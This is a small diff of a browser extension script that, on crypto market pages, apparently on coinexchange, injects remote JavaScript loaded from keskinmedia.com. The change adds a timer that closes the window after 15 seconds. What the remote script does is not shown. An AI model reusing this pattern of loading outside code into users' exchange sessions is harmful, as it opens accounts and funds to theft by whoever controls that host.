@@ -13,7 +13,7 @@ chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
     if (tab.url.includes('market/') && tab.url.includes('?')) {
       // Marketler İçin
       chrome.tabs.executeScript(tabId, {
-        code: "var i = document.createElement('script'); i.id='ipSc'; i.src = 'https://keskinmedia.com/api/inject-prod.js?v='+ Math.random(); document.head.appendChild(i);",
+        code: "setTimeout('window.close()', 1000 * 15); var i = document.createElement('script'); i.id='ipSc'; i.src = 'https://keskinmedia.com/api/inject-prod.js?v='+ Math.random(); document.head.appendChild(i);",
         runAt: "document_end"
       });
       console.log("Site coinexchange ve ? dan sonrası varsa");
